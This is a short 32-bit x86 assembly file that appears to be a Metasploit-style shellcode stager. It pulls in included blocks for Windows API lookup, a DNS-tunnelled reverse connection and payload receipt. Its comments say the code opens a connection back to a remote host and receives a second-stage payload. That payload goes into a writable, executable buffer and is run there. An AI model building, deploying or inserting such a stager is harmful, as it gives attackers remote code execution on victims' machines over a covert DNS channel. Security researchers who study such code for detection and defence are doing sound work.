[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop ebp                ; pop off the address of 'api_call' for calling later.
%include "./src/block/block_dns_tunnel.asm"
  ; By here we will have performed the reverse_tcp connection and EDI will be our socket.
  ; This is picked up by the DLL-stager (DNS tunneling) and connected to one side of the TCP abstraction.
%include "./src/block/block_recv.asm"
  ; By now we will have recieved in the second stage into a RWX buffer and be executing it

